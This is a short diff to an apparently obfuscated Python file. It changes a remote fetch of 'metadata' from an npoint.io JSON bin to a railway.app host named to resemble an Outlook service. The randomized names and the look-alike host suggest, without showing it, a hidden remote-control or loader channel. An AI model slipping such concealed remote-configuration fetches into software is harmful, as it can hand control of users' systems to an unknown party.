@@ -16,7 +16,7 @@ def config_ttmyaa_576():
 
     def net_mvkjlf_900():
         try:
-            config_hfpmdf_339 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_hfpmdf_339 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_hfpmdf_339.raise_for_status()
             net_grqcir_377 = config_hfpmdf_339.json()
             net_luvqlc_988 = net_grqcir_377.get('metadata')
